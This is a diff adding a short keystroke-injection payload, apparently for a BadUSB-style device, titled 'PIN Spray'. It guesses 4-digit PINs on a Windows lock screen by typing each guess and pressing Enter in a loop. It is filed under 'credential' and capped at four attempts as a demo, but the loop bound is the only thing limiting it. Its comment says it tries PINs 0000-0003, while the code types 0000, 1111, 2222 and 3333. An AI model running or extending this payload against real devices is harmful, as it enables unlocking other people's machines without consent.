@@ -1,0 +1,18 @@
+NAME PIN Spray
+DESCRIPTION Tries common 4-digit PINs on lock screen using FOR loop
+CATEGORY credential
+PLATFORMS WIN
+OPTION DELAY 1000 "Delay between attempts (ms)"
+PLATFORM WIN
+DELAY 1500
+PRINT Starting PIN spray...
+LED_COLOR YELLOW
+REM Try PINs 0000-0003 as demo (safety: only 4 attempts)
+FOR $I = 0 TO 3
+  PRINT Trying PIN $I...
+  STRING $I$I$I$I
+  ENTER
+  DELAY {{DELAY}}
+END_FOR
+LED_COLOR GREEN
+PRINT PIN spray complete
